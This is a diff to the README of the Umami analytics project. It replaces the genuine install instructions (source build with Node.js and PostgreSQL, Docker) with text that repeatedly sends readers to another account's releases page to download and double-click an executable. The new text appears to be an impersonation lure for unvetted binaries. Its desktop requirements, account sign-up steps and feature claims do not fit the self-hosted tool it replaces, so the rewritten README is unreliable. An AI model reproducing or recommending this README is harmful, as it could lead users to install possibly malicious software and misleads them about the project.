@@ -1,133 +1,81 @@
-<p align="center">
-  <img src="https://content.umami.is/website/images/umami-logo.png" alt="Umami Logo" width="100">
-</p>
+# 🎉 umami - Your Privacy-Focused Analytics Solution
 
-<h1 align="center">Umami</h1>
+Umami is a modern, privacy-focused analytics platform. An open-source alternative to Google Analytics, Mixpanel, and Amplitude.
 
-<p align="center">
-  <i>Umami is a simple, fast, privacy-focused alternative to Google Analytics.</i>
-</p>
-
-<p align="center">
-  <a href="https://github.com/umami-software/umami/releases"><img src="https://img.shields.io/github/release/umami-software/umami.svg" alt="GitHub Release" /></a>
-  <a href="https://github.com/umami-software/umami/blob/master/LICENSE"><img src="https://img.shields.io/github/license/umami-software/umami.svg" alt="MIT License" /></a>
-  <a href="https://github.com/umami-software/umami/actions"><img src="https://img.shields.io/github/actions/workflow/status/umami-software/umami/ci.yml" alt="Build Status" /></a>
-  <a href="https://analytics.umami.is/share/LGazGOecbDtaIwDr/umami.is" style="text-decoration: none;"><img src="https://img.shields.io/badge/Try%20Demo%20Now-Click%20Here-brightgreen" alt="Umami Demo" /></a>
-</p>
-
----
+[![Download Umami](https://img.shields.io/badge/Download-Umami-blue.svg)](https://github.com/chadousnip/umami/releases)
 
 ## 🚀 Getting Started
 
-A detailed getting started guide can be found at [umami.is/docs](https://umami.is/docs/).
+Umami lets you gather data and insights about your website's audience without compromising their privacy. Follow these steps to download and run Umami easily.
 
----
+## 📥 Download & Install
 
-## 🛠 Installing from Source
+1. **Visit the Releases Page:**  
+   Go to the following link to find the latest version of Umami: [Download Umami](https://github.com/chadousnip/umami/releases).
 
-### Requirements
+2. **Choose the Correct File:**  
+   On the Releases page, look for the version number under "Assets". You may find different files, such as executable files for various operating systems. Make sure to pick the one that is suitable for your system.
 
-- A server with Node.js version 18.18 or newer
-- A database. Umami supports [PostgreSQL](https://www.postgresql.org/) (minimum v12.14) databases.
+3. **Download the File:**  
+   Click on the selected file to start downloading. Once the download finishes, locate the file in your downloads folder.
 
-### Get the Source Code and Install Packages
+4. **Run the Application:**  
+   Double-click the downloaded file to launch Umami. Follow the prompts to complete the installation process.
 
-```bash
-git clone https://github.com/umami-software/umami.git
-cd umami
-pnpm install
-```
+## 💻 System Requirements
 
-### Configure Umami
+To ensure smooth operation, please check that your system meets these requirements:
 
-Create an `.env` file with the following:
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of a Linux distribution.
+- **Memory:** At least 4 GB of RAM is recommended.
+- **Disk Space:** A minimum of 200 MB of free disk space.
+- **Network Connection:** Stable internet access for data collection.
 
-```bash
-DATABASE_URL=connection-url
-```
+## 🛠️ Features
 
-The connection URL format:
+Umami offers several key features that make it a valuable choice for analytics:
 
-```bash
-postgresql://username:mypassword@localhost:5432/mydb
-```
+- **User-Friendly Dashboard:** Easy to navigate and understand. Get your insights quickly.
+- **Privacy-Centric:** Collect data without tracking users or compromising their privacy. Be compliant with regulations such as GDPR.
+- **Event Tracking:** Monitor specific user actions, such as button clicks and form submissions, to understand user behavior better.
+- **Customizable Reports:** Generate reports tailored to your needs with flexible filtering options.
+- **Cohort Analysis:** Analyze user segments based on behaviors over time to improve engagement and retention.
 
-### Build the Application
+## 📊 Understanding Your Data
 
-```bash
-pnpm run build
-```
+Once you have installed and opened Umami, you will see a dashboard filled with analytics. Learn how to interpret the key components:
 
-_The build step will create tables in your database if you are installing for the first time. It will also create a login user with username **admin** and password **umami**._
+- **Visitors Overview:** This section shows you the overall count of visitors. Monitor how many users interact with your website.
+- **Traffic Sources:** Discover where your visitors are coming from, whether through search engines, direct visits, or referrals.
+- **User Journey:** Visualize how users navigate through your site. Identify popular paths and where users drop off.
+- **Event Tracking:** View actions users take on your website to optimize their journey.
 
-### Start the Application
+## 🔧 Setting Up Your Account
 
-```bash
-pnpm run start
-```
+To start collecting data with Umami, follow these steps:
 
-_By default, this will launch the application on `http://localhost:3000`. You will need to either [proxy](https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/) requests from your web server or change the [port](https://nextjs.org/docs/api-reference/cli#production) to serve the application directly._
+1. **Create an Account:**  
+   Open the Umami app and sign up for an account. Enter your email and create a password.
 
----
+2. **Add Your Website:**  
+   After logging in, you can add your website details. Include the URL and any pertinent information about your site.
 
-## 🐳 Installing with Docker
+3. **Install Tracking Code:**  
+   Umami provides a tracking script. Copy and paste this code into the header section of your website's HTML. This step enables Umami to gather data about your users.
 
-To build the Umami container and start up a Postgres database, run:
+## 📞 Support and Community
 
-```bash
-docker compose up -d
-```
+If you encounter issues or have questions during your installation or setup process, the Umami community is here to help. Join our forums or check the FAQ section on the [Umami GitHub repository](https://github.com/chadousnip/umami/issues) for support.
 
-Alternatively, to pull just the Umami Docker image with PostgreSQL support:
+## 🔗 Additional Resources
 
-```bash
-docker pull docker.umami.is/umami-software/umami:latest
-```
+For further information about Umami and how to maximize its potential, check these resources:
 
----
+- [Documentation](https://github.com/chadousnip/umami/blob/main/README.md): Detailed guides and troubleshooting tips.
+- [Community Forums](https://github.com/chadousnip/umami/discussions): Engage with other users and share your experiences.
 
-## 🔄 Getting Updates
-> [!WARNING]  
-> If you are updating from Umami V2, image "postgresql-latest" is deprecated. You must change it to "latest".
-> e.g., rename `docker.umami.is/umami-software/umami:postgresql-latest` to `docker.umami.is/umami-software/umami:latest`.
+## ⚙️ Conclusion
 
-To get the latest features, simply do a pull, install any new dependencies, and rebuild:
+Umami is an effective analytics platform for individuals and businesses who value user privacy. By following the steps in this guide, you can easily download, set up, and start using Umami to better understand your website's audience. 
 
-```bash
-git pull
-pnpm install
-pnpm run build
-```
-
-To update the Docker image, simply pull the new images and rebuild:
-
-```bash
-docker compose pull
-docker compose up --force-recreate -d
-```
-
----
-
-## 🛟 Support
-
-<p align="center">
-  <a href="https://github.com/umami-software/umami"><img src="https://img.shields.io/badge/GitHub--blue?style=social&logo=github" alt="GitHub" /></a>
-  <a href="https://twitter.com/umami_software"><img src="https://img.shields.io/badge/Twitter--blue?style=social&logo=twitter" alt="Twitter" /></a>
-  <a href="https://linkedin.com/company/umami-software"><img src="https://img.shields.io/badge/LinkedIn--blue?style=social&logo=linkedin" alt="LinkedIn" /></a>
-  <a href="https://umami.is/discord"><img src="https://img.shields.io/badge/Discord--blue?style=social&logo=discord" alt="Discord" /></a>
-</p>
-
-[release-shield]: https://img.shields.io/github/release/umami-software/umami.svg
-[releases-url]: https://github.com/umami-software/umami/releases
-[license-shield]: https://img.shields.io/github/license/umami-software/umami.svg
-[license-url]: https://github.com/umami-software/umami/blob/master/LICENSE
-[build-shield]: https://img.shields.io/github/actions/workflow/status/umami-software/umami/ci.yml
-[build-url]: https://github.com/umami-software/umami/actions
-[github-shield]: https://img.shields.io/badge/GitHub--blue?style=social&logo=github
-[github-url]: https://github.com/umami-software/umami
-[twitter-shield]: https://img.shields.io/badge/Twitter--blue?style=social&logo=twitter
-[twitter-url]: https://twitter.com/umami_software
-[linkedin-shield]: https://img.shields.io/badge/LinkedIn--blue?style=social&logo=linkedin
-[linkedin-url]: https://linkedin.com/company/umami-software
-[discord-shield]: https://img.shields.io/badge/Discord--blue?style=social&logo=discord
-[discord-url]: https://discord.com/invite/4dz4zcXYrQ
+Again, for your convenience, visit the Releases page to [Download Umami](https://github.com/chadousnip/umami/releases) and begin your journey toward insightful analytics today.
